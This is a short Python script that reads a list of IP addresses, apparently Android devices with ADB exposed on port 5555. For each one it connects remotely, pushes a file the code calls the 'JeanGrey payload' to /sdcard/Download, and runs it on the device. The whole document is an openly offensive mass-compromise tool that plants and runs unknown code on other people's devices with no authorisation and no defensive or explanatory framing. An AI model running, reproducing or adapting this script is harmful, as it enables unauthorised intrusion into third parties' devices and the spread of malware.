import subprocess
import time
import os

TARGET_FILE = "adb_hits.txt"
JEANGREY_PAYLOAD = os.path.join(os.path.dirname(__file__), "jeangrey_android.py")
DEVICE_PATH = "/sdcard/Download/jeangrey_android.py"

def inject_jeangrey(ip):
    subprocess.run(["adb", "connect", f"{ip}:5555"], capture_output=True)
    subprocess.run(["adb", "push", JEANGREY_PAYLOAD, DEVICE_PATH], capture_output=True)
    subprocess.run(["adb", "shell", f"python {DEVICE_PATH}"], capture_output=True)

def main():
    if not os.path.exists(JEANGREY_PAYLOAD):
        print("[!] JeanGrey payload not found.")
        return
    with open(TARGET_FILE, "r") as f:
        targets = f.read().splitlines()
    for ip in targets:
        inject_jeangrey(ip)
        time.sleep(1)

if __name__ == "__main__":
    main()
